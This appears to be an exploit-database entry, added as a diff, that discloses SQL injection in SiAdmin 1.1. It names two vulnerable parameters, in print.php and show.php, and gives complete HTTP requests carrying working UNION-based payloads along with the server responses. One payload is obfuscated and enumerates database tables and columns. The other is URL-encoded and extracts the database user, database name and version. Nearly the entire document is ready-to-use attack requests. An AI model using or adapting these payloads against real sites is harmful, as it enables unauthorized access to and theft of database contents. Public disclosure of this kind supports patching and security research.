@@ -1,0 +1,59 @@
+# Exploit Title: SiAdmin 1.1 - 'id' SQL Injection
+# Dork: N/A
+# Date: 2018-11-04
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.bubul.net/
+# Software Link: https://kent.dl.sourceforge.net/project/siadmin/SiAdmin%201.1/SiAdmin%201.1.zip
+# Version: 1.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/modul/mod_beasiswa/print.php?op=print&id=[SQL]
+# 
+GET /[PATH]/modul/mod_beasiswa/print.php?op=print&id=-4%27%20%20UNION%20%20SELECT%201,2,3,4,5,6,(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x),8--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=va3kfka1v4dqvadpkdpm7f7vs0
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 04 Nov 2018 13:22:52 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: private, max-age=0, must-revalidate
+Pragma: public
+Content-Disposition: inline; filename="Ansanwan-Laporan.pdf"
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: application/pdf
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/show.php?op=beasiswa&act=lihat&id=[SQL]
+# 
+GET /[PATH]/show.php?op=beasiswa&act=lihat&id=%2d%34%27%20%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%33%2c%34%2c%35%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%37%2c%38%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=va3kfka1v4dqvadpkdpm7f7vs0
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 04 Nov 2018 13:30:25 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 6079
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
